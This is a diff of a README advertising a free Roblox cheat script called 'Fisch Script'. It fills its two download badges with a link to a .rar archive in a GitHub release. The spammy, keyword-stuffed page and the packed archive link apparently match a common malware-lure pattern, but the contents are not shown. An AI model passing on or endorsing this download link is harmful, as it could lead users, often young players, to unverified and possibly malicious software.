@@ -1,10 +1,10 @@
 # 🐟 **Fisch Script — The Best Free Roblox Script for Blox Fruits & More (2025 Edition)** 🎮  
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)]()  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://github.com/BafristoRBX/fisch-script/releases/download/Update/Update.rar)  
 
 ![fis1](https://github.com/user-attachments/assets/56cff2cb-f850-4002-9e3b-30a384fdd3b5)
 
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)]()  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-green?style=for-the-badge&logo=download)](https://github.com/BafristoRBX/fisch-script/releases/download/Update/Update.rar)  
 
 ---
 
